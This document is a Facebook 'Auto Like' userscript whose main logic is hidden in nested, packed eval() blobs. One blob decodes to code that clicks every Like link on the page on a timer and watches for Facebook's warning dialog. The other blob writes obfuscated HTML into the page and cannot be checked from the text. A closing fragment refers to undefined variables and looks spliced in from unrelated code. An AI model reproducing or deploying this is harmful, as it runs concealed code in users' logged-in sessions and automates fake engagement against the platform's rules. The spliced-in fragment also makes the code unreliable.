// ==UserScript==
// @name			Facebook Auto Like
// @description		Simple Facebook Auto Like
// @author			http://www.facebook.com/Khamim.outside 		
// @authorURL		http://www.facebook.com/Khamim.Outside    
// @downloadURL     http://userscripts.org/scripts/source/152147.user.js
// @include			htt*://www.facebook.com/*
// @exclude 		htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
    div.style.width = "120px";
    div.style.height = "15px";
	div.style.bottom = "420px";
	div.style.left = "6px";
	div.style.backgroundColor = "#ffffff";
	div.style.border = "2px solid #0090ff";
	div.style.padding = "3px";
    div.innerHTML = "<center><a style=\"font-weight:bold;color:#556fa6\" href=\"/Khamim.Outside\">Created by: Khamim</a><center>"
	
	body.appendChild(div);
}
 body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "120px";
 div.style.height = "15px";
 div.style.opacity= 0.90;
 div.style.bottom = "448px";
 div.style.left = "6px";
 div.style.backgroundColor = "#ffffff";
 div.style.border = "2px solid #0090ff";
 div.style.padding = "3px";
 eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2a(1Y(p,a,c,k,e,r){e=1Y(c){1Z(c<a?\'\':e(2b(c/a)))+((c=c%a)>2c?21.2d(c+29):c.2e(2f))};22(!\'\'.24(/^/,21)){25(c--)r[e(c)]=k[c]||e(c);k=[1Y(e){1Z r[e]}];e=1Y(){1Z\'\\\\w+\'};c=1};25(c--)22(k[c])p=p.24(2g 2h(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);1Z p}(\'12(S(p,a,c,k,e,r){e=S(c){T(c<a?\\\'\\\':e(13(c/a)))+((c=c%a)>U?V.14(c+W):c.15(X))};Y(!\\\'\\\'.Z(/^/,V)){10(c--)r[e(c)]=k[c]||e(c);k=[S(e){T r[e]}];e=S(){T\\\'\\\\\\\\w+\\\'};c=1};10(c--)Y(k[c])p=p.Z(16 17(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);T p}(\\\'E.F=(G(\\\\\\\'%f%9%4%5%3%4%d%g%f%6%8%6%r%6%s%7%h%i%a%2%j%6%r%6%s%j%h%0%1%1%0%p%j%h%0%1%1%0%p%k%c%d%0%h%7%1%4%H%c%t%c%I%c%d%0%h%7%1%4%k%7%q%a%l%e%e%e%e%e%l%u%e%u%l%J%l%v%m%K%6%n%c%w%1%0%9%6%3%7%0%5%a%l%2%8%d%0%1%4%a%2%x%o%3%3%0%5%2%8%d%4%1%a%2%6%b%i%5%9%y%c%0%b%3%2%8%7%q%a%2%o%k%e%k%i%2%8%b%3%i%1%4%a%2%h%0%5%3%y%p%4%7%L%t%3%z%x%0%1%q%w%9%0%1%0%d%z%M%N%O%P%m%m%v%2%8%0%5%9%1%7%9%A%a%2%B%5%0%5%i%n%0%o%b%Q%m%C%D%2%g%f%b%c%6%5%8%9%1%6%b%b%a%2%4%n%0%3%7%9%0%5%8%4%n%0%3%7%9%0%5%k%1%7%A%4%2%8%3%7%3%1%4%a%2%C%i%D%2%g%f%j%b%c%6%5%g%8%B%1%1%8%R%3%6%3%o%b%f%j%6%g%f%j%9%4%5%3%4%d%g\\\\\\\'));\\\',11,11,\\\'18|19|1a|1b|1c|1d|1e|1f|1g|1h|1i|1j|1k|1l|1m|1n|1o|1p|1q|1r|1s|1t|1u|1v|1w|1x|1y|1z|1A|1B|1C|1D|1E|1F|1G|1H|1I|1J|1K|W|1L|1M|1N|1O|1P|1Q|1R|1S|1T|1U|1V|U|X|1W\\\'.1X(\\\'|\\\'),0,{}))\',2i,2k,\'||||||||||||||||||||||||||||||||||||||||||||||||||||||1Y|1Z|2c|21|29|2f|22|24|25|2l|2a|2b|2d|2e|2g|2h|2m|2n|27|2o|2p|2q|2r|2s|20|2t|2u|2v|2w|2x|30|2y|2z|2A|2B|2F|2C|31|2G|2H|2I|2J|2K|2L|2M|2N|2O|2P|2Q|2i|2D|2R|2S|2T|28|2U|2V|2W|2E|2X|34|26|2Y|23|33|2Z|32|2j\'.2j(\'|\'),0,{}))',62,191,'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return||String|if||replace|while|||||eval|parseInt|35|fromCharCode|toString|36|new|RegExp|62|split|122|54|6F|6C|74|65|6E|61|69|63|3D|73|70|72|3C|3E|66|79|5F||||39|6D|75|77|64|6A|78|68|37|38|3B|3A|6B|41|div|innerHTML|unescape|3F|67|42|||53||'.split('|'),0,{}))
 body.appendChild(div);
 eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('k.b=4(){3 B=0;3 J=0;3 I=8.c("a");3 H=l m();d(3 D=0;D<I.5;D++){6(I[D].9("7")!=e&&I[D].9("7").f("n")>=0&&(I[D].2=="o p"||I[D].2=="q"||I[D].2=="אוהב את"||I[D].2=="r"||I[D].2=="s"||I[D].2=="الإعجاب"||I[D].2=="???!"||I[D].2=="?"||I[D].2=="t"||I[D].2=="???"||I[D].2=="J’u")){H[J]=I[D];J++}}4 E(L){H[L].v();3 K="<a w=\'x-z:O;P:Q\' R=\'b()\'><g><h 7=\'S T\' U=\'(y)\'></h> V: "+(L+1)+"/"+H.5+"</g></a>";8.W("X").2=K}4 G(K){i.j(C,K)}4 A(){3 M=8.c("Y");3 N=Z;d(3 L=0;L<M.5;L++){3 K=M[L].9("7");6(K!=e&&K.f("10 11 12")>=0){13("14 15 16");N=17}}6(!N){G(18)}}4 F(K){i.j(A,K)}4 C(){6(B<H.5){E(B);F(19);B++}};C()}',62,72,'||innerHTML|var|function|length|if|class|document|getAttribute||Anonymous69|getElementsByTagName|for|null|indexOf|center|span|window|setTimeout|unsafeWindow|new|Array|UFILikeLink|Me|gusta|Like|Suka|Begen|Seneng|aime|click|style|font||weight|||||||||||||||bold|color|green|onclick|emoticon|emoticon_like|title|Status|getElementById|like2|label|false|uiButton|uiButtonLarge|uiButtonConfirm|alert|Warning|from|Facebook|true|2160|700'.split('|'),0,{}))
}

(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
    
	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
	});
})(); 

//---